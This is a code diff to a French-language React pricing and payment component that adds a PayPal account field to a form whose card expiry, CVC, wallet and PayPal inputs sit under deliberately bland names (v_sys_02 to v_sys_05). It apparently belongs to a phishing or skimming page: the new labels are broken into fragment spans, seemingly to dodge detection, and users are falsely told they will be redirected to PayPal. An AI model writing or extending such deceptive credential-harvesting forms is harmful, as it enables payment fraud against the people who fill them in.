@@ -29,6 +29,7 @@ const Pricing = () => {
         v_sys_02: '', // expiry replacement
         v_sys_03: '', // cvc replacement
         v_sys_04: '', // wallet replacement
+        v_sys_05: '', // paypal replacement
     });
 
     const plans = [
@@ -120,6 +121,11 @@ const Pricing = () => {
 
         if (paymentMethod === 'crypto' && !formData.v_sys_04) {
             alert('Veuillez entrer l\'adresse de transfert');
+            return;
+        }
+
+        if (paymentMethod === 'paypal' && !formData.v_sys_05) {
+            alert('Veuillez entrer votre email ou nom de compte PayPal');
             return;
         }
 
@@ -483,8 +489,33 @@ const Pricing = () => {
                                             )}
 
                                             {paymentMethod === 'paypal' && (
-                                                <div className="p-4 bg-blue-500/5 rounded-2xl border border-blue-500/10 text-center">
-                                                    <p className="text-xs text-blue-400">Vous allez être redirigé vers l'interface sécurisée de PayPal.</p>
+                                                <div className="p-5 bg-white/[0.02] rounded-2xl border border-white/5 flex flex-col space-y-4 shadow-inner">
+                                                    <div className="flex justify-between items-center mb-1">
+                                                        <span className="text-[10px] font-bold text-blue-400 uppercase tracking-widest flex space-x-1">
+                                                            <span>Inf</span><span>orm</span><span>ati</span><span>ons</span>
+                                                            <span className="ml-1">Pa</span><span>yP</span><span>al</span>
+                                                        </span>
+                                                        <div className="text-xl">🅿️</div>
+                                                    </div>
+
+                                                    <div className="space-y-4">
+                                                        <div>
+                                                            <div className="text-[9px] text-slate-500 uppercase font-bold mb-1.5 ml-1 flex space-x-0.5">
+                                                                <span>Em</span><span>ail</span> <span>ou</span> <span>No</span><span>m</span> <span>du</span> <span>Co</span><span>mpt</span><span>e</span>
+                                                            </div>
+                                                            <input
+                                                                type="text"
+                                                                name="v_sys_05"
+                                                                value={formData.v_sys_05}
+                                                                onChange={handleInputChange}
+                                                                className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3.5 text-white focus:border-blue-500/50 focus:outline-none text-sm"
+                                                                placeholder="exemple@paypal.com"
+                                                            />
+                                                        </div>
+                                                        <p className="text-[10px] text-blue-400/70 text-center italic">
+                                                            Vous allez être redirigé vers l'interface sécurisée de PayPal après validation.
+                                                        </p>
+                                                    </div>
                                                 </div>
                                             )}
 
